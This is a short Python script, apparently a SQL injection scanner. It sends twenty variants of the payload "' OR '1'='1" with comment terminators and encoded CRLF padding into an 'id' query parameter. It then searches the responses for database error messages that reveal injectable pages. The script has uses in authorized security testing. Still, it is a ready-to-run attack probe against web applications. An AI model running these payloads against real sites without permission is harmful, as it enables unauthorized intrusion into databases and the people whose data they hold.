import requests

def check_sqli(url):
    # List of payloads to test for SQLi
    payloads = [
        "' OR '1'='1",  # Basic payload
        "' OR '1'='1' --",  # With single-line comment
        "' OR '1'='1' /*",  # With multi-line comment start
        "' OR '1'='1' */",  # With multi-line comment end
        "' OR '1'='1' #",  # With another single-line comment
        "' OR '1'='1' --%0D%0A",  # With CRLF
        "' OR '1'='1' /*%0D%0A",  # With CRLF and multi-line comment start
        "' OR '1'='1' #%0D%0A",  # With CRLF and single-line comment
        "' OR '1'='1' --%0D%0A%0D%0A",  # With multiple CRLF
        "' OR '1'='1' /*%0D%0A%0D%0A",  # With multiple CRLF and multi-line comment start
        "' OR '1'='1' #%0D%0A%0D%0A",  # With multiple CRLF and single-line comment
        "' OR '1'='1' --%0D%0A%0D%0A%0D%0A",  # With more CRLF
        "' OR '1'='1' /*%0D%0A%0D%0A%0D%0A",  # With more CRLF and multi-line comment start
        "' OR '1'='1' #%0D%0A%0D%0A%0D%0A",  # With more CRLF and single-line comment
        "' OR '1'='1' --%0D%0A%0D%0A%0D%0A%0D%0A",  # With even more CRLF
        "' OR '1'='1' /*%0D%0A%0D%0A%0D%0A%0D%0A",  # With even more CRLF and multi-line comment start
        "' OR '1'='1' #%0D%0A%0D%0A%0D%0A%0D%0A",  # With even more CRLF and single-line comment
        "' OR '1'='1' --%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A",  # With many CRLF
        "' OR '1'='1' /*%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A",  # With many CRLF and multi-line comment start
        "' OR '1'='1' #%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A",  # With many CRLF and single-line comment
    ]

    # Try injecting into a parameter
    if "?" in url:
        test_url = url + "&id="
    else:
        test_url = url + "?id="

    errors = [
        "You have an error in your SQL syntax",
        "Warning: mysql_",
        "Unclosed quotation mark after the character string",
        "quoted string not properly terminated"
    ]

    for payload in payloads:
        try:
            resp = requests.get(test_url + payload, timeout=5)
            for error in errors:
                if error in resp.text:
                    return True
        except Exception as e:
            print(f"Error occurred: {e}")
            pass

    return False

# Example usage
if __name__ == "__main__":
    test_url = "http://example.com/vulnerable-page"
    if check_sqli(test_url):
        print("SQL Injection vulnerability detected!")
    else:
        print("No SQL Injection vulnerability detected.")
